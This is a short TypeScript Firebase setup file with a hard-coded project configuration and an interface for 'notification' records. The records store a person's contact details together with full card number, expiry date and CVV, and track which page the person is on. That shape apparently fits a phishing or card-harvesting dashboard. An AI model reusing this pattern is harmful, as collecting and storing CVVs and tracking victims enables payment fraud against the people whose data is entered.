import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
     apiKey: "AIzaSyBIrh9ho-h-RAgf7K1ntFbkqsrLfnq5zoo",
  authDomain: "zdhrj-a0017.firebaseapp.com",
  databaseURL: "https://zdhrj-a0017-default-rtdb.firebaseio.com",
  projectId: "zdhrj-a0017",
  storageBucket: "zdhrj-a0017.firebasestorage.app",
  messagingSenderId: "355621979268",
  appId: "1:355621979268:web:42c8841d2fd362cf422ed1",
  measurementId: "G-D464L8PDJT"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}


